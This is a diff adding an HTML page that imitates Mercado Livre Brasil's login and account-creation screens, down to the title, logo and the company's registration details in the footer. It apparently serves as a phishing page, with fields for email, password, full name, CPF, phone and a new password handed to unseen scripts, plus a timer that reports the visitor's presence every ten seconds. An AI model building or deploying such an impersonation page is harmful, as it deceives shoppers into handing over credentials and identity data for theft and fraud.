@@ -1,0 +1,301 @@
+<html>
+
+<head></head>
+
+<body id="body" style="margin:0;width:100%;-webkit-text-size-adjust:none;">
+  <div style="display:none;">
+    <span id="caminhoAtual" style="display:none;">/16521881</span>
+    <span id="caminhoBase" style="display:none;">../06621881</span>
+  </div>
+  <style>
+    input[type=number]::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+
+    }
+
+    input[type=number] {
+      -moz-appearance: textfield;
+      appearance: textfield;
+
+    }
+  </style>
+
+
+
+  <title>Mercado Livre Brasil: Frete grátis no mesmo dia</title>
+  <meta charset="utf-8">
+  <link rel="stylesheet" href=/css/css.css?time=1711324328">
+  <script type="text/javascript" src="/js/jquery.js"></script>
+  <script type="text/javascript" src=/js/js.js?time=1711324328"></script>
+
+  <link rel="stylesheet" href=/css/login.css?time=1711324328">
+  <script type="text/javascript" src=/js/js.js?time=1711324328"></script>
+  <script type="text/javascript" src=/js/login.js?time=1711324328"></script>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0">
+  <meta name="format-detection" content="telephone=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  <link rel="shortcut icon" href="https://i.imgur.com/vTSvZLQ.png" sizes="16x16">
+
+
+
+  <span id="local" style="display:none;">login</span>
+  <script>
+    local = $('#local').text();
+    online(local);
+    $('#hiddenclick').click();
+    setInterval(function() {
+      if (document.hasFocus() == true) {
+        local = $('#local').text();
+        online(local);
+      }
+    }, 10000);
+  </script>
+  <!--FIXED-->
+  <!--loading-->
+  <div id="loading" style="position:fixed;width:100vw;height:100vh;background-color:#fff059;display:none;align-items:center;z-index:105;">
+    <style>
+      .loader {
+        margin: 25px;
+        border: solid 5px #3483fa;
+        border-top: 5px solid rgba(0, 0, 0, 0);
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <div style="width:100%;">
+      <div style="margin:0 auto;height:70px;text-align:center;">
+        <div class="loader" style="margin:0 auto;"></div>
+      </div>
+      <div style="margin:0 auto;text-align:center;display:flex;align-items:center;">
+        <span style="margin:0 auto;font-family:nunitoregular;font-size:16px;color:rgba(0,0,0,.9);"></span>
+      </div>
+    </div>
+  </div>
+  <div id="loading2" style="position:fixed;width:100vw;height:100vh;background-color:rgba(255,255,255,0.9);display:none;align-items:center;z-index:105;">
+    <style>
+      .loader {
+        margin: 25px;
+        border: solid 5px #3483fa;
+        border-top: 5px solid rgba(0, 0, 0, 0);
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <div style="width:100%;">
+      <div style="margin:0 auto;height:70px;text-align:center;">
+        <div class="loader" style="margin:0 auto;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!--HEADER-->
+  <header style="width:100vw;background-color:#fff159;position:relative;">
+    <div class="headerMobile">
+      <img onclick="irPara(&quot;inicio&quot;);" src="/images/dfYjscn.png" style="margin:0 10px;height:32px;">
+    </div>
+  </header>
+
+  <main style="display:flex;flex-flow:column;">
+
+    <div id="campoEscolha" style="display:block;text-align:center;">
+      <span class="marginTop" style="display:block;font-family:proximaNovaRegular;font-size:20px;font-weight:600;color:rgba(0,0,0,.9);">Olá! Para comprar, acesse a sua conta</span>
+      <div onclick="criarConta();" style="margin-top:15px;flex-grow:1;height:48px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;">
+        <span style="margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;">Criar conta</span>
+      </div>
+      <div onclick="entrar();" style="margin-top:10px;flex-grow:1;height:48px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;">
+        <span style="margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#3483fa;">Entrar</span>
+      </div>
+    </div>
+
+    <div id="campoEntrar" style="display:none;">
+      <span id="tituloEntrar1" style="margin-bottom:35px;display:block;font-family:proximaNovaRegular;font-size:20px;font-weight:600;color:rgba(0,0,0,.9);">Digite o seu e-mail ou usuário</span>
+      <span id="tituloEntrar2" style="margin-bottom:35px;display:none;font-family:proximaNovaRegular;font-size:20px;font-weight:600;color:rgba(0,0,0,.9);">Agora, sua senha Mercado Livre</span>
+      <div id="campoLoginUsuario1" style="display:block;position:relative;flex-grow:1;">
+        <div style="flex-grow:1;display:flex;flex-flow:column;">
+          <span style="display:block;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">Telefone, e-mail ou usuário</span>
+          <input type="text" id="loginEntrar" placeholder="Ex: seuemail@exemplo.com" style="margin-top:5px;flex-grow:1;padding:15px 10px;border:solid 1px #ededed;border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">
+        </div>
+        <div id="erroLoginEntrar" style="position:absolute;left:15px;bottom:-20px;padding:2px 10px;flex-grow:1;height:25px;display:none;align-items:center;border-radius:4px;background-color:#ff0000;">
+          <div style="position:absolute;top:-5px;left:20px;width:8px;height:8px;background-color:#ff0000;border-left:solid 1px rgba(0,0,0,.12);border-top:solid 1px rgba(0,0,0,.12);transform:rotate(45deg);z-index:10;"></div>
+          <span style="display:block;font-family:proximaNovaRegular;font-size:14px;color:#ffffff;">Telefone, e-mail ou usuário inválido</span>
+        </div>
+      </div>
+      <div id="campoLoginUsuario2" style="margin-bottom:35px;width:max-content;display:none;align-items:center;padding:2px;border:solid 1px #ededed;border-radius:15px;">
+        <div style="margin-right:10px;width:26px;height:26px;display:flex;align-items:center;background-color:#ededed;border-radius:50%;">
+          <i class="material-icons" style="margin:0 auto;font-size:22px;color:rgba(0,0,0,.71);"></i>
+        </div>
+        <span id="loginDoUsuario" style="margin-right:10px;font-family:proximaNovaRegular;font-size:12px;font-weight:600;color:rgba(0,0,0,.9);">emaildeteste2023amigoml@gmail.com</span>
+        <i onclick="voltarParaLogin();" class="material-icons" style="font-size:18px;color:rgba(0,0,0,.55);"></i>
+      </div>
+      <div id="campoSenhaUsuario" style="display:none;margin:20px 0 35px;position:relative;flex-grow:1;">
+        <div style="flex-grow:1;display:flex;flex-flow:column;">
+          <span style="display:block;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">Senha</span>
+          <input type="password" id="senhaEntrar" placeholder="" style="margin-top:5px;flex-grow:1;padding:15px 10px;border:solid 1px #ededed;border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">
+        </div>
+        <div id="erroSenhaEntrar" style="position:absolute;left:15px;bottom:-20px;padding:2px 10px;flex-grow:1;height:25px;display:none;align-items:center;border-radius:4px;background-color:#ff0000;">
+          <div style="position:absolute;top:-5px;left:20px;width:8px;height:8px;background-color:#ff0000;border-left:solid 1px rgba(0,0,0,.12);border-top:solid 1px rgba(0,0,0,.12);transform:rotate(45deg);z-index:10;"></div>
+          <span style="display:block;font-family:proximaNovaRegular;font-size:14px;color:#ffffff;">Senha inválida</span>
+        </div>
+      </div>
+
+      <div id="botoesLogin1" style="display:block;">
+        <div onclick="continuarLogin();" style="margin-top:15px;flex-grow:1;height:48px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;">
+          <span style="margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;">Continuar</span>
+        </div>
+        <div onclick="criarConta();" style="margin-top:10px;flex-grow:1;height:48px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;">
+          <span style="margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#3483fa;">Criar conta</span>
+        </div>
+      </div>
+      <div id="botoesLogin2" style="display:none;">
+        <div onclick="acessar();" style="margin-top:15px;flex-grow:1;height:48px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;">
+          <span style="margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;">Entrar</span>
+        </div>
+      </div>
+
+    </div>
+
+    <div id="campoCriarConta" style="display:none;">
+      <span style="display:block;font-family:proximaNovaRegular;font-size:20px;font-weight:600;color:rgba(0,0,0,.9);">Complete os dados para criar sua conta</span>
+
+      <div style="position:relative;margin-top:20px;padding:15px;flex-grow:1;display:flex;align-items:center;border-radius:6px;box-shadow: 0px 5px 12px 2px rgba(0,0,0,0.0)">
+        <div style="margin-right:15px;width:39px;height:39px;display:flex;align-items:center;border:solid 2px #ededed;border-radius:50%;">
+          <i class="material-icons" style="margin:0 auto;font-size:24px;color:#3483fa;"></i>
+        </div>
+        <div style="flex-grow:1;display:flex;flex-flow:column;">
+          <span style="display:block;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">Adicione seu e-mail</span>
+          <input type="text" id="emailCadastro" placeholder="Ex: seuemail@exemplo.com" style="margin-top:5px;flex-grow:1;padding:15px 10px;border:solid 1px #ededed;border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">
+        </div>
+        <div id="erroEmailCadastro" style="position:absolute;left:73px;bottom:-22px;padding:2px 10px;flex-grow:1;height:25px;display:none;align-items:center;border-radius:4px;background-color:#ff0000;">
+          <div style="position:absolute;top:-5px;left:20px;width:8px;height:8px;background-color:#ff0000;border-left:solid 1px rgba(0,0,0,.12);border-top:solid 1px rgba(0,0,0,.12);transform:rotate(45deg);z-index:10;"></div>
+          <span style="display:block;font-family:proximaNovaRegular;font-size:14px;color:#ffffff;">Adicione um e-mail válido</span>
+        </div>
+      </div>
+
+      <div style="position:relative;margin-top:20px;padding:15px;flex-grow:1;display:flex;align-items:center;border-radius:6px;box-shadow: 0px 10px 22px 4px rgba(0,0,0,0.0)">
+        <div style="margin-right:15px;width:39px;height:39px;display:flex;align-items:center;border:solid 2px #ededed;border-radius:50%;">
+          <i class="material-icons" style="margin:0 auto;font-size:24px;color:#3483fa;"></i>
+        </div>
+        <div style="flex-grow:1;display:flex;flex-flow:column;">
+          <span style="display:block;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">Seu nome completo</span>
+          <input type="text" id="nomeCadastro" placeholder="Ex: Maria da silva" style="margin-top:5px;flex-grow:1;padding:15px 10px;border:solid 1px #ededed;border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">
+        </div>
+        <div id="erroNomeCadastro" style="position:absolute;left:73px;bottom:-22px;padding:2px 10px;flex-grow:1;height:25px;display:none;align-items:center;border-radius:4px;background-color:#ff0000;">
+          <div style="position:absolute;top:-5px;left:20px;width:8px;height:8px;background-color:#ff0000;border-left:solid 1px rgba(0,0,0,.12);border-top:solid 1px rgba(0,0,0,.12);transform:rotate(45deg);z-index:10;"></div>
+          <span style="display:block;font-family:proximaNovaRegular;font-size:14px;color:#ffffff;">Adicione seu nome corretamente</span>
+        </div>
+      </div>
+
+      <div style="position:relative;margin-top:20px;padding:15px;flex-grow:1;display:none;align-items:center;border-radius:6px;box-shadow: 0px 10px 22px 4px rgba(0,0,0,0.0)">
+        <div style="margin-right:15px;width:39px;height:39px;display:flex;align-items:center;border:solid 2px #ededed;border-radius:50%;">
+          <i class="material-icons" style="margin:0 auto;font-size:24px;color:#3483fa;transform:rotate(180deg);"></i>
+        </div>
+        <div style="flex-grow:1;display:flex;flex-flow:column;">
+          <span style="display:block;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">Confirme seu cpf</span>
+          <input type="text" id="cpfCadastro" placeholder="Ex: 123.456.789-10" style="margin-top:5px;flex-grow:1;padding:15px 10px;border:solid 1px #ededed;border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">
+        </div>
+        <div id="erroCpfCadastro" style="position:absolute;left:73px;bottom:-22px;padding:2px 10px;flex-grow:1;height:25px;display:none;align-items:center;border-radius:4px;background-color:#ff0000;">
+          <div style="position:absolute;top:-5px;left:20px;width:8px;height:8px;background-color:#ff0000;border-left:solid 1px rgba(0,0,0,.12);border-top:solid 1px rgba(0,0,0,.12);transform:rotate(45deg);z-index:10;"></div>
+          <span style="display:block;font-family:proximaNovaRegular;font-size:14px;color:#ffffff;">CPF inválido</span>
+        </div>
+      </div>
+
+      <div style="position:relative;margin-top:20px;padding:15px;flex-grow:1;display:flex;align-items:center;border-radius:6px;box-shadow: 0px 10px 22px 4px rgba(0,0,0,0.0)">
+        <div style="margin-right:15px;width:39px;height:39px;display:flex;align-items:center;border:solid 2px #ededed;border-radius:50%;">
+          <i class="material-icons" style="margin:0 auto;font-size:24px;color:#3483fa;"></i>
+        </div>
+        <div style="flex-grow:1;display:flex;flex-flow:column;">
+          <span style="display:block;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">Adicione seu telefone/Whats App</span>
+          <input type="text" id="telefoneCadastro" onkeyup="mascaraCelular(&quot;telefoneCadastro&quot;,&quot;&quot;,&quot;senhaCadastro&quot;);" placeholder="Ex: 11 9 9999-9999" style="margin-top:5px;flex-grow:1;padding:15px 10px;border:solid 1px #ededed;border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">
+        </div>
+        <div id="erroTelefoneCadastro" style="position:absolute;left:73px;bottom:-22px;padding:2px 10px;flex-grow:1;height:25px;display:none;align-items:center;border-radius:4px;background-color:#ff0000;">
+          <div style="position:absolute;top:-5px;left:20px;width:8px;height:8px;background-color:#ff0000;border-left:solid 1px rgba(0,0,0,.12);border-top:solid 1px rgba(0,0,0,.12);transform:rotate(45deg);z-index:10;"></div>
+          <span style="display:block;font-family:proximaNovaRegular;font-size:14px;color:#ffffff;">Adicione um telefone válido</span>
+        </div>
+      </div>
+
+      <div style="position:relative;margin-top:20px;padding:15px;flex-grow:1;display:flex;align-items:center;border-radius:6px;box-shadow: 0px 10px 22px 4px rgba(0,0,0,0.0)">
+        <div style="margin-right:15px;width:39px;height:39px;display:flex;align-items:center;border:solid 2px #ededed;border-radius:50%;">
+          <i class="material-icons" style="margin:0 auto;font-size:24px;color:#3483fa;"></i>
+        </div>
+        <div style="flex-grow:1;display:flex;flex-flow:column;">
+          <span style="display:block;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">Crie sua senha</span>
+          <input type="password" id="senhaCadastro" placeholder="******" style="margin-top:5px;flex-grow:1;padding:15px 10px;border:solid 1px #ededed;border-radius:6px;background-color:rgba(0,0,0,0);outline:0;font-family:proximaNovaRegular;font-size:16px;color:rgba(0,0,0,.9);">
+        </div>
+        <div id="erroSenhaCadastro" style="position:absolute;left:73px;bottom:-22px;padding:2px 10px;flex-grow:1;height:25px;display:none;align-items:center;border-radius:4px;background-color:#ff0000;">
+          <div style="position:absolute;top:-5px;left:20px;width:8px;height:8px;background-color:#ff0000;border-left:solid 1px rgba(0,0,0,.12);border-top:solid 1px rgba(0,0,0,.12);transform:rotate(45deg);z-index:10;"></div>
+          <span style="display:block;font-family:proximaNovaRegular;font-size:14px;color:#ffffff;">Crie uma senha válida</span>
+        </div>
+      </div>
+
+      <div onclick="criarMinhaConta();" style="margin-top:20px;flex-grow:1;height:50px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;">
+        <span style="margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;">Criar minha conta</span>
+      </div>
+      <div onclick="entrar();" style="margin-top:10px;flex-grow:1;height:48px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;">
+        <span style="margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#3483fa;">Entrar</span>
+      </div>
+
+    </div>
+
+
+
+  </main>
+
+  <footer>
+    <div style="margin:25px;flex-grow:1;word-break:break-word;">
+      <span style="display:block;font-family:proximaNovaRegular;font-size:12px;color:#333333;">Termos e condições Como cuidamos da sua privacidade Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span>
+      <span style="display:block;font-family:proximaNovaRegular;font-size:12px;color:#999999;opacity:.9;">© 1999-2024 Ebazar.com.br LTDA.</span>
+      <span style="display:block;font-family:proximaNovaRegular;font-size:12px;color:#888888;">CNPJ n.º 03.007.331/0001-41 Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903</span>
+    </div>
+  </footer>
+
+
+
+  <div id="imageDownloaderSidebarContainer">
+    <div class="image-downloader-ext-container">
+      <div tabindex="-1" class="b-sidebar-outer">
+        <!---->
+        <div id="image-downloader-sidebar" tabindex="-1" role="dialog" aria-modal="false" aria-hidden="true" class="b-sidebar shadow b-sidebar-right bg-light text-dark" style="width: 500px; display: none;">
+          <!---->
+          <div class="b-sidebar-body">
+            <div></div>
+          </div>
+          <!---->
+        </div>
+        <!---->
+        <!---->
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
